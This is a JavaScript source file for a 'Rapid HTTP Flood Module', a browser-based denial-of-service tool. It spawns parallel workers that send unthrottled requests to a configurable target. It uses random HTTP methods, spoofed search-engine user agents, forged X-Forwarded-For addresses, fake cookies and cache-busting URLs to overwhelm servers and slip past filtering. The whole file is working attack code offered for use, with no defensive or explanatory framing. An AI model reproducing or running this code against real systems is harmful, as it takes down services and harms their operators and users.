// Rapid HTTP Flood Module
window.executeRapidAttack = function(attackConfig) {
    console.log(`[RAPID] Starting attack: ${attackConfig.id}`);
    
    const target = attackConfig.target;
    const proxies = attackConfig.proxies || [];
    const power = attackConfig.power;
    const duration = attackConfig.duration * 1000;
    
    let requestCount = 0;
    let active = true;
    
    // Auto-stop after duration
    setTimeout(() => {
        active = false;
        console.log(`[RAPID] Attack ${attackConfig.id} completed`);
    }, duration);
    
    // Worker function for parallel requests
    function attackWorker(workerId) {
        if (!active) return;
        
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ];
        
        function send() {
            if (!active) return;
            
            const method = methods[Math.floor(Math.random() * methods.length)];
            const headers = {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Requested-With': 'XMLHttpRequest',
                'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
            };
            
            // Add random referer
            if (Math.random() > 0.5) {
                headers['Referer'] = `https://www.google.com/search?q=${Math.random().toString(36).substring(7)}`;
            }
            
            // Add random cookies
            if (Math.random() > 0.7) {
                headers['Cookie'] = `session=${Math.random().toString(36).substring(2)}; token=${Math.random().toString(36).substring(2)}`;
            }
            
            const requestOptions = {
                method: method,
                headers: headers,
                mode: 'no-cors',
                credentials: 'omit'
            };
            
            // For POST requests, add random body
            if (method === 'POST' || method === 'PUT') {
                requestOptions.body = JSON.stringify({
                    data: Math.random().toString(36).repeat(100),
                    timestamp: Date.now()
                });
                headers['Content-Type'] = 'application/json';
            }
            
            fetch(target + '?' + Math.random(), requestOptions)
                .catch(() => {}) // Ignore all errors
                .finally(() => {
                    requestCount++;
                    // Continue the loop
                    if (active) {
                        // No delay for maximum flood
                        send();
                    }
                });
        }
        
        // Start this worker
        send();
    }
    
    // Launch workers based on power
    for (let i = 0; i < power * 2; i++) {
        setTimeout(() => {
            attackWorker(i);
        }, i * 10);
    }
    
    return {
        stop: () => { active = false; },
        stats: () => ({ requests: requestCount, active: active })
    };
};